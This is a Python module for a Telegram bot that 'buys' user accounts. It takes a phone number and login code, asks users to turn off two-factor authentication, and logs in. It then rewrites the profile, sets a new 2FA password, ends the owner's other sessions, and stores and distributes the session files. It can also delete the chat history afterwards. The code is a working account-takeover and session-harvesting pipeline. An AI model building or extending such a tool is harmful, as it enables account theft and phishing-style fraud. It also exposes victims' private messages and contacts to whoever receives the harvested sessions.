"""
Selling Flow Handlers
Handles the complete account selling conversation flow including phone input, OTP verification, and account processing
"""
import logging
import asyncio
import glob
import time
import os
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, ConversationHandler, CallbackQueryHandler, MessageHandler, filters
from services.real_telegram import RealTelegramService
from services.account_configuration import account_config_service
from services.session_management import session_manager
from services.telegram_logger import TelegramChannelLogger
from services.session_distribution import session_distribution
from utils.helpers import PhoneUtils
from database import get_db_session, close_db_session
from database.operations import (
    UserService,
    TelegramAccountService,
    ActivityLogService,
    SystemSettingsService,
)
from database.models import TelegramAccount, AccountStatus
from services.chat_cleanup import purge_bot_history

logger = logging.getLogger(__name__)

# Conversation states
PHONE, WAITING_OTP, OTP_RECEIVED, DISABLE_2FA_WAIT, NAME_INPUT, PHOTO_INPUT, NEW_2FA_INPUT, FINAL_CONFIRM = range(8)

# Initialize real Telegram service and notification logger
telegram_service = RealTelegramService()
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
telegram_logger = TelegramChannelLogger(BOT_TOKEN) if BOT_TOKEN else None


# Session Cleanup
async def cleanup_old_sessions():
    """Clean up old Telegram session files that cause OTP conflicts."""
    try:
        # Remove old session files
        session_files = glob.glob("*.session*")
        cleaned_count = 0
        
        for session_file in session_files:
            try:
                file_age = os.path.getctime(session_file)
                current_time = time.time()
                if current_time - file_age > 3600:  # 1 hour
                    os.remove(session_file)
                    cleaned_count += 1
                    logger.info(f"Removed old session file: {session_file}")
            except Exception as e:
                logger.error(f"Error removing session file {session_file}: {e}")
        
        if cleaned_count > 0:
            logger.info(f"Cleaned up {cleaned_count} old session files")
                
    except Exception as e:
        logger.error(f"Error in session cleanup: {e}")


async def handle_enhanced_otp_request(phone_number: str):
    """Enhanced OTP request with proper session management."""
    try:
        # Clean up old sessions first
        await cleanup_old_sessions()
        
        # Add delay between requests to avoid flood limits
        await asyncio.sleep(2)
        
        # Send OTP with fresh session
        result = await telegram_service.send_verification_code(phone_number)
        return result
        
    except Exception as e:
        logger.error(f"Error in enhanced OTP request: {e}")
        return {
            'success': False,
            'error': 'enhanced_otp_failed',
            'message': str(e)
        }


async def start_real_selling(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start real selling process - show confirmation first."""
    
    # Mark this as a selling conversation
    context.user_data['conversation_type'] = 'selling'
    
    sell_text = """
🚀 **Real Telegram Account Selling**

**💰 Sell Your Telegram Account - 100% Real Process!**

⚠️ **This is REAL - not a simulation!**

**What we do:**
• Send **real OTP** to your phone via Telegram
• **Actually login** to your account  
• **Really modify** account settings
• **Actually transfer** ownership
• **Real payment** processing

**⚡ Important Notes:**
• Make sure you have access to your phone
• The process is irreversible once started
• You'll receive real OTP codes
• Account transfer is permanent

**Are you ready to proceed?**
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ Ready! Let's Go", callback_data="confirm_ready_to_sell")],
        [InlineKeyboardButton("❓ Need More Info", callback_data="selling_info")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
    ]
    
    await update.callback_query.edit_message_text(
        sell_text, 
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return PHONE


async def handle_ready_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the 'Ready?' confirmation and proceed to phone input."""
    
    phone_prompt_text = """
🚀 **Account Selling - Phone Number Required**

**📱 Please provide your phone number:**

**Format:** +CountryCode + Phone Number
**Examples:**
• 🇺🇸 US: `+1234567890`
• 🇮🇳 India: `+919876543210`
• 🇬🇧 UK: `+441234567890`

**⚠️ Important:**
• Use the EXACT number linked to your Telegram account
• Include the + symbol and country code
• No spaces or special characters

**Type your phone number below:**
    """
    
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="start_real_selling")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_sale")]
    ]
    
    await update.callback_query.edit_message_text(
        phone_prompt_text,
        parse_mode='Markdown', 
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return PHONE


async def handle_selling_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show detailed information about the selling process."""
    
    info_text = """
📋 **Account Selling Process - Detailed Information**

**🔍 What Exactly Happens:**

**Step 1 - Verification:**
• We send a real OTP to your phone
• You receive it via Telegram app
• This proves you own the account

**Step 2 - Account Analysis:**
• We check account age, activity, followers
• Determine market value
• No changes made yet

**Step 3 - Transfer Process:**
• We securely modify account settings
• Transfer ownership to buyer
• Process is irreversible

**Step 4 - Payment:**
• Instant payment to your account
• Full transparency, no hidden fees
• Payment before final transfer

**💰 Typical Account Values:**
• New accounts (0-6 months): $5-15
• Aged accounts (6-12 months): $15-35
• Premium accounts (1+ years): $35-100+

**✅ Why Choose Us:**
• 100% legitimate process
• Secure and private
• Fair market pricing
• 24/7 support

**Ready to proceed?**
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ I'm Ready!", callback_data="confirm_ready_to_sell")],
        [InlineKeyboardButton("🔙 Back", callback_data="start_real_selling")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_sale")]
    ]
    
    await update.callback_query.edit_message_text(
        info_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return PHONE


async def handle_real_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle phone number input via text message."""
    user = update.effective_user
    message_text = update.message.text if update.message else "No text"
    
    # STRICT ISOLATION: Only handle if we're explicitly in a selling conversation
    if context.user_data.get('conversation_type') != 'selling':
        logger.info(f"Phone handler - User {user.id} not in selling conversation")
        return
    
    logger.info(f"Selling - User {user.id} sent phone: '{message_text}'")
    
    phone = message_text.strip()
    
    # Validate phone format
    if not phone.startswith('+') or len(phone) < 8:
        await update.message.reply_text(
            "❌ **Invalid Format!**\n\nPlease include country code: `+1234567890`",
            parse_mode='Markdown'
        )
        return PHONE
    
    # Store phone
    context.user_data['phone'] = phone
    
    # Send OTP
    processing_msg = await update.message.reply_text(
        f"📡 **Sending Real OTP to {phone}**\n\n⏳ Connecting to Telegram API...",
        parse_mode='Markdown'
    )
    
    try:
        result = await handle_enhanced_otp_request(phone)
        
        if result['success']:
            context.user_data['phone_code_hash'] = result['phone_code_hash']
            context.user_data['session_key'] = result['session_key']
            
            delivery_method = result.get('delivery_method', 'SMS')
            code_type = result.get('code_type', 'SMS')
            
            otp_text = f"""
✅ **Verification Code Sent!**

📱 **Phone:** `{phone}`
📨 **Delivery:** {delivery_method} 
⏰ **Type:** {code_type}

**Check your phone's SMS messages and enter the 5-digit code:**
            """
            
            keyboard = [
                [InlineKeyboardButton("🔄 Resend Code", callback_data="resend_otp")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_sale")]
            ]
            
            await processing_msg.edit_text(
                otp_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return WAITING_OTP
            
        else:
            error_msg = result['message']
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_sale")]
            ]
            
            await processing_msg.edit_text(
                f"❌ **Error:** {error_msg}",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error in phone entry: {e}")
        await processing_msg.edit_text(f"❌ **Error:** {str(e)}", parse_mode='Markdown')
        return ConversationHandler.END


async def handle_real_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle OTP input via text message."""
    user = update.effective_user
    otp_code = update.message.text.strip()
    
    # Validate OTP format
    if not otp_code.isdigit() or len(otp_code) != 5:
        await update.message.reply_text(
            "❌ **Invalid Code!**\n\nPlease enter the 5-digit code.",
            parse_mode='Markdown'
        )
        return WAITING_OTP
    
    # Verify OTP
    processing_msg = await update.message.reply_text(
        "🔐 **Verifying Code...**\n\n⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    try:
        phone = context.user_data.get('phone')
        phone_code_hash = context.user_data.get('phone_code_hash')
        session_key = context.user_data.get('session_key')
        
        result = await telegram_service.verify_code(
            phone_number=phone,
            code=otp_code,
            phone_code_hash=phone_code_hash,
            session_key=session_key
        )
        
        if result['success']:
            # OTP verified successfully
            context.user_data['verified'] = True
            context.user_data['requires_2fa'] = result.get('requires_2fa', False)
            
            if result.get('requires_2fa'):
                await processing_msg.edit_text(
                    "⚠️ **2FA Detected!**\n\nPlease disable Two-Factor Authentication and click continue.",
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("📱 How to Disable 2FA", callback_data="show_2fa_help"),
                        InlineKeyboardButton("✅ Continue", callback_data="continue_setup")
                    ]])
                )
                return DISABLE_2FA_WAIT
            else:
                await processing_msg.edit_text(
                    "✅ **Account Verified!**\n\nProceeding to account setup...",
                    parse_mode='Markdown'
                )
                # Continue to processing
                return await start_real_processing(update, context)
        else:
            await processing_msg.edit_text(
                f"❌ **Verification Failed:** {result.get('message', 'Invalid code')}",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔄 Try Again", callback_data="resend_otp")
                ]])
            )
            return WAITING_OTP
            
    except Exception as e:
        logger.error(f"Error verifying OTP: {e}")
        await processing_msg.edit_text(
            f"❌ **Error:** {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END


async def handle_continue_setup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Continue setup after 2FA handling."""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "⚙️ **Processing Account...**\n\n⏳ Please wait while we configure your account.",
        parse_mode='Markdown'
    )
    
    return await start_real_processing(update, context)


async def handle_2fa_disabled(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle user confirmation of 2FA disabled."""
    return await handle_continue_setup(update, context)


async def start_real_processing(update, context) -> int:
    """Perform full account configuration, security cleanup, and payout."""
    user = update.effective_user
    process_msg = None
    db = get_db_session()

    try:
        phone = context.user_data.get('phone')
        session_key = context.user_data.get('session_key')
        country_code = PhoneUtils.get_country_code(phone) if phone else None
        if not country_code:
            country_code = context.user_data.get('country_code')
        if not country_code:
            country_code = 'XX'
        context.user_data['country_code'] = country_code

        if not phone or not session_key:
            raise ValueError("Missing phone or session key for sale processing")

        status_blocks = {
            'config': '⏳ Changing account name, username & photo…',
            'twofa': '⏳ Setting secure 2FA…',
            'sessions': '⏳ Terminating other sessions…',
            'settle': '⏳ Finalizing payout…'
        }

        async def render_progress() -> str:
            return (
                "⚡ **Processing Account Sale...**\n\n"
                f"{status_blocks['config']}\n"
                f"{status_blocks['twofa']}\n"
                f"{status_blocks['sessions']}\n"
                f"{status_blocks['settle']}"
            )

        if update.callback_query:
            process_msg = await update.callback_query.edit_message_text(
                await render_progress(),
                parse_mode='Markdown'
            )
        else:
            process_msg = await update.message.reply_text(
                await render_progress(),
                parse_mode='Markdown'
            )

        db_user = UserService.get_user_by_telegram_id(db, user.id)
        if not db_user:
            raise RuntimeError("User record not found")

        # Ensure account record exists and is marked pending
        account = TelegramAccountService.get_account_by_phone(db, phone)
        if not account:
            account = TelegramAccountService.create_account(
                db=db,
                seller_id=db_user.id,
                phone=phone,
                status=AccountStatus.PENDING.value,
                session_string=session_key,
                country_code=country_code
            )
        else:
            account.status = AccountStatus.PENDING.value
            account.session_string = session_key
            account.country_code = country_code
            db.commit()

        client = await telegram_service.get_client_from_session(session_key)
        if not client:
            raise RuntimeError("Unable to establish Telegram session for automation")

        # Step 1: automatic configuration (name, username, photo, bio)
        status_blocks['config'] = '✅ Account identity updated'
        config_result = await account_config_service.configure_account_after_sale(
            client, db_user.id, session_key
        )

        new_settings = config_result.get('new_settings', {})
        change_count = len(config_result.get('changes_made', []))
        if not config_result.get('success'):
            status_blocks['config'] = '⚠️ Account identity update encountered issues'

        await process_msg.edit_text(await render_progress(), parse_mode='Markdown')

        # Step 2: setup new 2FA password
        new_2fa_password = None
        twofa_result = await account_config_service.setup_new_2fa(client, db_user.id)
        if twofa_result.get('success'):
            new_2fa_password = twofa_result.get('new_password')
            status_blocks['twofa'] = '✅ New 2FA password applied'
        else:
            status_blocks['twofa'] = '⚠️ Unable to set new 2FA automatically'

        await process_msg.edit_text(await render_progress(), parse_mode='Markdown')

        # Step 3: session monitoring and termination
        monitoring_result = await session_manager.monitor_account_sessions(
            client, db_user.id, account.id
        )
        terminate_result = await session_manager.terminate_all_user_sessions(
            client, db_user.id
        )
        status_blocks['sessions'] = '✅ Other sessions terminated'
        if not terminate_result.get('success'):
            status_blocks['sessions'] = '⚠️ Session termination requires review'

        await process_msg.edit_text(await render_progress(), parse_mode='Markdown')

        # Step 4: finalize settlement
        base_price = 25.0
        bonus_per_change = 5.0
        bonus_twofa = 5.0 if new_2fa_password else 0.0
        sale_price = round(base_price + change_count * bonus_per_change + bonus_twofa, 2)

        db_user.balance += sale_price
        db_user.total_accounts_sold += 1
        db_user.total_earnings += sale_price

        account.status = AccountStatus.SOLD.value
        account.current_account_name = new_settings.get('name')
        account.current_username = new_settings.get('username')
        account.current_bio = new_settings.get('bio')
        account.two_fa_password = new_2fa_password
        account.sold_at = datetime.now()
        account.sale_price = sale_price
        account.multi_device_detected = bool(monitoring_result.get('multi_device_detected'))
        account.session_string = None
        account.country_code = country_code

        db.commit()

        # Persist and distribute session file
        distribution_result = await session_distribution.save_and_distribute(
            db=db,
            phone=phone,
            client=client,
            account=account,
            seller=db_user,
            country_code=country_code,
            sale_price=sale_price,
            config_changes=config_result.get('changes_made', []),
            new_2fa_password=new_2fa_password,
            terminate_result=terminate_result,
            monitoring_result=monitoring_result,
            sale_metadata={
                'new_settings': new_settings,
                'sale_price': sale_price,
            }
        )

        ActivityLogService.log_action(
            db=db,
            user_id=db_user.id,
            action="ACCOUNT_SALE_COMPLETED",
            details=f"Account {phone} sold for ${sale_price:.2f}",
            extra_data=json.dumps({
                "changes": config_result.get('changes_made', []),
                "twofa_set": bool(new_2fa_password),
                "sessions_terminated": terminate_result.get('success', False),
                "device_count": monitoring_result.get('device_count'),
                "session_distribution": {
                    "saved": distribution_result.get('saved') if distribution_result else False,
                    "distributed": distribution_result.get('distributed') if distribution_result else False,
                    "channel": distribution_result.get('channel_summary') if distribution_result else None,
                    "country": distribution_result.get('country_code') if distribution_result else country_code
                }
            })
        )

        status_blocks['settle'] = '✅ Payout credited to balance'
        await process_msg.edit_text(await render_progress(), parse_mode='Markdown')

        # Notify operations channel if configured
        session_info_payload = None
        if distribution_result and distribution_result.get('session_info'):
            session_info_payload = distribution_result['session_info']
        else:
            session_file_path = f"{session_key}.session"
            session_info_payload = {
                'session_file': session_file_path if os.path.exists(session_file_path) else 'N/A',
                'metadata_file': None,
                'cookies_file': None
            }
        if distribution_result and not distribution_result.get('distributed') and distribution_result.get('saved'):
            session_info_payload.setdefault('notes', 'stored locally')

        if telegram_logger:
            try:
                await telegram_logger.log_account_sale(
                    phone=phone,
                    country_code=country_code,
                    buyer_id=user.id,
                    buyer_username=user.username,
                    price=sale_price,
                    session_info={
                        'session_file': session_info_payload.get('session_file'),
                        'metadata_file': session_info_payload.get('metadata_file'),
                        'cookies_file': session_info_payload.get('cookies_file'),
                        'changes': config_result.get('changes_made', []),
                        'distribution': distribution_result.get('channel_summary') if distribution_result else None
                    }
                )
            except Exception as log_error:
                logger.warning("Unable to log account sale to channel: %s", log_error)

        # Build success summary
        name_summary = new_settings.get('name', 'Updated')
        username_summary = new_settings.get('username', 'updated')
        bio_summary = new_settings.get('bio')

        change_lines = []
        change_lines.append(f"• 👤 Name set to `{name_summary}`")
        change_lines.append(f"• 📝 Username set to `@{username_summary}`")
        change_lines.append("• 📸 Profile photo refreshed" if 'photo_changed' in config_result.get('changes_made', []) else "• 📸 Profile photo unchanged")
        if bio_summary:
            change_lines.append(f"• 🧾 Bio updated: `{bio_summary}`")
        change_lines.append(f"• 🔐 New 2FA password: `{new_2fa_password[:3]}***`" if new_2fa_password else "• 🔐 New 2FA password: ⚠️ Manual follow-up required")
        change_lines.append("• 🔄 Other sessions terminated" if terminate_result.get('success') else "• 🔄 Session cleanup requires manual review")
        if monitoring_result.get('multi_device_detected'):
            change_lines.append("• ⚠️ Multi-device activity detected; account placed on hold")
        if distribution_result:
            if distribution_result.get('distributed'):
                change_lines.append(f"• 📦 Session delivered: `{distribution_result.get('channel_summary', 'dispatched')}`")
            elif distribution_result.get('saved'):
                change_lines.append("• 📦 Session stored locally pending delivery")

        success_text = f"""
🎉 **ACCOUNT SOLD SUCCESSFULLY!**

📱 **Phone:** `{phone}`
💰 **Payment Credited:** `${sale_price:.2f}`
💳 **New Balance:** `${db_user.balance:.2f}`

✅ **Automation Summary:**
{chr(10).join(change_lines)}

🛡️ **Security:**
• Session Monitoring: {'✅ Clean' if not monitoring_result.get('multi_device_detected') else '⚠️ Hold Applied'}
• Sessions Terminated: {'✅ Yes' if terminate_result.get('success') else '⚠️ Check Logs'}

🗒️ **Notes:**
• All details saved in audit log
• Ownership transfer completed instantly
• You no longer have access to this account
        """

        keyboard = [
            [InlineKeyboardButton("💳 Check Balance", callback_data="check_balance")],
            [InlineKeyboardButton("🚀 Sell Another Account", callback_data="start_real_selling")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
        ]

        final_message = await process_msg.edit_text(
            success_text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        # Optional chat cleanup based on system settings
        try:
            cleanup_enabled = bool(
                SystemSettingsService.get_setting(
                    db,
                    'delete_chat_history_on_sale',
                    default=False,
                )
            )
        except Exception as settings_error:
            logger.warning("Unable to read chat cleanup setting: %s", settings_error)
            cleanup_enabled = False

        if cleanup_enabled:
            try:
                chat_id = update.effective_chat.id if update.effective_chat else None
                latest_message_id = getattr(final_message, 'message_id', None)

                if chat_id is not None and latest_message_id is not None:
                    deleted_count = await purge_bot_history(
                        bot=context.bot,
                        chat_id=chat_id,
                        latest_message_id=latest_message_id,
                        keep_last=1,
                        max_delete=40,
                        log=logger,
                    )

                    ActivityLogService.log_action(
                        db=db,
                        user_id=db_user.id if db_user else None,
                        action="CHAT_CLEANUP",
                        details=f"Deleted {deleted_count} messages after sale submission",
                        extra_data=json.dumps(
                            {
                                "chat_id": chat_id,
                                "deleted": deleted_count,
                            }
                        ),
                    )
                else:
                    logger.debug(
                        "Skipping chat cleanup due to missing chat/message context"
                    )
            except Exception as cleanup_error:
                logger.warning("Chat cleanup after sale submission failed: %s", cleanup_error)

        # Release in-memory session
        try:
            await telegram_service.cleanup_session(session_key)
        except Exception as cleanup_exc:
            logger.debug("Session cleanup warning: %s", cleanup_exc)

        context.user_data.clear()
        return ConversationHandler.END

    except Exception as e:
        logger.error(f"Error processing account: {e}")
        error_text = f"❌ **Error:** {str(e)}\n\nPlease try again later."

        if process_msg:
            await process_msg.edit_text(error_text, parse_mode='Markdown')
        elif update.callback_query:
            await update.callback_query.edit_message_text(error_text, parse_mode='Markdown')
        else:
            await update.message.reply_text(error_text, parse_mode='Markdown')

        return ConversationHandler.END

    finally:
        close_db_session(db)


async def cancel_sale(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the selling process."""
    query = update.callback_query
    await query.answer("Sale cancelled")
    
    await query.edit_message_text(
        "❌ **Sale Cancelled**\n\nYou can start again anytime from the main menu.",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
        ]])
    )
    
    # Clear conversation data
    context.user_data.clear()
    
    return ConversationHandler.END


def get_real_selling_handler():
    """Create and return the selling conversation handler."""
    return ConversationHandler(
        entry_points=[
            CallbackQueryHandler(start_real_selling, pattern='^start_real_selling$')
        ],
        states={
            PHONE: [
                CallbackQueryHandler(handle_ready_confirmation, pattern='^confirm_ready_to_sell$'),
                CallbackQueryHandler(handle_selling_info, pattern='^selling_info$'),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_real_phone)
            ],
            WAITING_OTP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_real_otp),
                CallbackQueryHandler(handle_real_phone, pattern='^resend_otp$')
            ],
            DISABLE_2FA_WAIT: [
                CallbackQueryHandler(handle_2fa_disabled, pattern='^2fa_disabled$'),
                CallbackQueryHandler(handle_continue_setup, pattern='^continue_setup$')
            ]
        },
        fallbacks=[
            CallbackQueryHandler(cancel_sale, pattern='^cancel_sale$')
        ],
        per_message=False,
        per_user=True,
        allow_reentry=True
    )
